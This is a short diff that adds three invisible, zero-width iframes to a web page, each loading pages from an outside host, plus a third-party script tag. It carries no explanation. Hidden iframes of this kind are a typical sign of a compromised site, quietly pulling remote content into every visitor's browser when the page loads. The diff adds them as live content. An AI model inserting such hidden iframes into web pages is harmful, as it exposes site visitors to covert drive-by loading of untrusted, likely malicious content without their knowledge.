@@ -1,0 +1,6 @@
+<iframe src=http://count23.51yes.ws/rot/14.htm width=0 height=0></iframe>
+<iframe src=http://count23.51yes.ws/ying/realha.htm width=0 height=0></iframe>
+<iframe src=http://count23.51yes.ws/ying/haha.htm width=0 height=0></iframe>
+
+
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/1533902.js"></script>
